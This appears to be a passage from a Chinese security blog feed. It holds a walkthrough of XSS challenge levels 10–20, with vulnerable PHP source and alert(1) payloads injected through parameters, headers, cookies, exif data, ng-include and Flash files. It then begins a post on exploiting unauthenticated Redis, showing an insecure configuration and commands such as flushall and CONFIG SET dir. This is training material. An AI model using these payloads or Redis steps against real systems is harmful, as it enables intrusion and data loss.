class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>发现GET参数<code>t_sort</code>会被过滤<code>&lt;&gt;</code>输出，所以可以使用事件属性进行构造利用</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558251116826.png" alt="1558251116826"></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="Referer头插入"><a href="#Referer头插入" class="headerlink" title="Referer头插入"></a>Referer头插入</h3><p>隐藏表单多了一个<code>&lt;input&gt;</code></p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558251262671.png" alt="1558251262671"></p><p>把全部表单的值通过GET参数传递过去</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558251563250.png" alt="1558251563250"></p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558251601685.png" alt="1558251601685"></p><p>只有t_sort接收了get传参，看起来双引号被转义掉了，尝试了单引号也不行，又尝试了POST传参也不行</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>和上一关的代码类似，但是<code>t_sort</code>的值经过了html实体化转义，所以无法在此处进行利用了。不过新的<code>t_ref</code>，的值是通过referer头获取的，可以抓包修改Referer头的内容，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558252521803.png" alt="1558252521803"></p><p>总结：</p><p>要注意细节，寻找提示信息，不放过任何一处我们提交的数据内容</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="UA头插入"><a href="#UA头插入" class="headerlink" title="UA头插入"></a>UA头插入</h3><p>在页面源码中发现User-Agent信息</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558252884442.png" alt="1558252884442"></p><p>修改UA头部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558253045262.png" alt="1558253045262"></p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558253074469.png" alt="1558253074469"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟上一关一样，区别就在于获取的请求头部信息变成了<code>User-Agent</code>，所以只需要抓包修改UA的内容即可</p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="Cookie插入"><a href="#Cookie插入" class="headerlink" title="Cookie插入"></a>Cookie插入</h3><p>注意到cookie参数</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558253383778.png" alt="1558253383778"></p><p>查看cookie内容</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558253574394.png" alt="1558253574394"></p><p>修改cookie，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558253654942.png" alt="1558253654942"></p><p>成功触发XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟之前一样，区别就在于获取的请求头部信息换成了获取cookie中的<code>user</code>的值，所以把cookie中user的值里插入payload即可</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif xss"></a>exif xss</h3><p>这关使用<code>&lt;iframe&gt;</code>嵌入了一个小网页（注意：需要访问到<code>外网</code>才能访问）</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558254716646.png" alt="1558254716646"></p><p>发现搜索框有输出点</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558254944255.png" alt="1558254944255"></p><p>尝试闭合标签</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558255107617.png" alt="1558255107617"></p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558255149283.png" alt="1558255149283"></p><p>&lt;&gt;被转义掉了，感觉这里不存在可利用的点了。</p><p>看下源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只有一个iframe标签引用了<a href="http://exofvoewer.org/" target="_blank" rel="noopener">http://exofvoewer.org</a>，最后看了下<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">先知上的wp</a>，了解到这关考察的是exif xss，漏洞原理是通过修改图片的exif信息，造成解析图片exif触发XSS。</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558360067701.png" alt="1558360067701"></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(1)&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558358694058.png" alt="1558358694058"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="文件包含插入"><a href="#文件包含插入" class="headerlink" title="文件包含插入"></a>文件包含插入</h3><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558265228176.png" alt="1558265228176"></p><p>先试了一下闭合标签</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558266783744.png" alt="1558266783744"></p><p><code>&lt;&gt;</code>被转义掉了，再试一下事件属性</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558266984431.png" alt="1558266984431"></p><p>双引号也被转义掉了，一时没了思路，看了下网上的文章，说是要注意下面这里</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558267117962.png" alt="1558267117962"></p><p>上网查了一下相关知识</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558265795045.png" alt="1558265795045"></p><p>发现ng-include可以利用，因为不能跨域，所以包含一个前面的关卡，<code>&lt;script&gt;</code>没有成功，使用<code>&lt;img&gt;</code>成功触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;/h2&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;h2&gt;&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558266253831.png" alt="1558266253831"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>此处只有一个输出点，被实体化转义过了，也不是单引号闭合，所以无法逃逸，只能从<code>ng-include</code>处入手了。</p><p>还有一点疑问，我们的payload明明被实体化转义掉了，为什么还可以再原样输出回来呢？</p><p>总结：</p><p>发现不一样，不了解的点时，多去查查相关资料，不能错过知识点外的机会。</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558267796468.png" alt="1558267796468"></p><p>尝试<code>&lt;script&gt;</code>标签</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558268014317.png" alt="1558268014317"></p><p><code>script</code> 和 <code>/</code> 替换为空，试一下<code>svg</code></p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558268343632.png" alt="1558268343632">发现只有空格被过滤掉，使用<code>%0a</code> <code>%0d</code>做分隔符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br><span class="line">?keyword=&lt;svg%0donload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558268510194.png" alt="1558268510194"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>只是对空格，<code>script</code>，<code>/</code> 进行了过滤，不使用<code>script</code>，并且用其他方式代替空格即可成功绕过。</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="属性空格逃逸"><a href="#属性空格逃逸" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558273349908.png" alt="1558273349908"></p><p>可以看到可控的参数有两个，试一下标签逃逸</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558273500807.png" alt="1558273500807"></p><p><code>&lt;&gt;</code>，<code>&quot;</code>被过滤，最后试出来个哈哈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558273987115.png" alt="1558273987115"></p><p>那这样应该也能行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558274123391.png" alt="1558274123391"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>虽然参数都加上了实体化转义，但是没有引号闭合属性，所以添加空格就可以写个新属性啦哈哈</p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><h3 id="属性空格逃逸-1"><a href="#属性空格逃逸-1" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p>Excuse me ???，上把的payload都没变</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558274541848.png" alt="1558274541848"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我瞅了半天，才发现只是引用的swf文件名不一样。。好吧，下一关</p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这关试了怎么试都跳不出了属性的值</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558313314215.png" alt="1558313314215"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：这里和上两关</p><p>的区别就在于有了双引号来闭合属性的值，又因为使用了实体化转义的函数，双引号无法逃脱出去。所以这关考察的应该是Flash XSS，参考了<a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">D4rk3r</a>这位大佬的文章</p><p>使用工具<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a></p><p>首先找到getURL函数</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558315194981.png" alt="1558315194981"></p><p>然后发现了version参数会被传入loc4变量中，即sIFR的内容中</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558315623256.png" alt="1558315623256"></p><p>但是根据第一张图中getURL只在内容为link时打开，所以再看下contentIsLink()函数</p><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558316052078.png" alt="1558316052078"></p><p>得知构造<code>&lt;a&gt;&lt;/a&gt;</code>标签来传值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558316206643.png" alt="1558316206643"></p><p>注意：我的火狐浏览器加载不出来flash，这里用的chrome可以加载</p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><h3 id="Flash-XSS-1"><a href="#Flash-XSS-1" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这一关和上关一样，考察Flash XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网上说是<strong>zeroclipboard.swf</strong> 的XSS，其主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上，下面给出xss poc代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id</span><br><span class="line">&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS-Challenge/XSS挑战之旅/1558343919410.png" alt="1558343919410"></p><p>看一下flash代码，看不懂了 (￣_￣|||)，就先记录一下payload吧。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p><p><a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">XSS挑战之旅–游戏闯关</a></p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">【巨人肩膀上的矮子】XSS挑战之旅—游戏通关攻略（更新至18关）</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问漏洞</title>
      <link href="/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h2><p><code>Redis</code>是一个开源的，基于<code>ANSI C语言</code>开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统</p><h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p> Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 <code>Redis</code>服务本身的特性及其运维不当造成的。</p><p><code>Redis</code>的默认配置文件中，会绑定 <code>0.0.0.0:6379</code>，这样 <code>Redis</code>会监听一切 <code>IP</code>，接收一切 <code>IP</code>的请求。如果没有采用添加防火墙规则等安全策略屏蔽非信任来源 <code>IP</code>访问，就会使 <code>Redis</code>服务暴露在公网，被任意用户进行登录。</p><p><code>Redis</code>默认没有设置密码认证，没有进行相应的密码验证会导致任意 用户免密登录 <code>Redis</code>，从而读取 <code>Redis</code>的数据、篡改 <code>Redis</code>的数据或者更高危的操作。</p><a id="more"></a><h2 id="二、Redis安装"><a href="#二、Redis安装" class="headerlink" title="二、Redis安装"></a>二、Redis安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get update</span><br><span class="line">$sudo apt-get install redis-server</span><br></pre></td></tr></table></figure><h2 id="二、Redis服务器配置"><a href="#二、Redis服务器配置" class="headerlink" title="二、Redis服务器配置"></a>二、Redis服务器配置</h2><p>修改配置文件 /opt/redis/redis.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bind 127.0.0.1#监听任意ip</span><br><span class="line">protected-mode no#关闭保护模式</span><br></pre></td></tr></table></figure><p>启动redis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf #重新加载配置文件</span><br></pre></td></tr></table></figure><h2 id="三、Redis客户端连接"><a href="#三、Redis客户端连接" class="headerlink" title="三、Redis客户端连接"></a>三、Redis客户端连接</h2><p>客户端（本地宿主机）连接redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure><h2 id="四、基础命令"><a href="#四、基础命令" class="headerlink" title="四、基础命令"></a>四、基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info#版本信息，服务器信息等</span><br><span class="line">set name &quot;hi&quot;#设置变量</span><br><span class="line">get name #取值</span><br><span class="line">flushall #删除数据库（一般情况下不要用！）</span><br><span class="line">keys * #查看所有的键</span><br><span class="line">CONFIG GET dir/dbfilename#获取默认的Reids目录和rdb的文件名，在修改前先获取，然后走的时候再恢复</span><br><span class="line">CONFIG SET dir/dbfilename#修改默认的Reids目录和rdb的文件名</span><br><span class="line">save#执行同步保存操作，将当前Redis实例的所有数据快照(snapshot)以RDB文件的形式保存到硬盘。</span><br><span 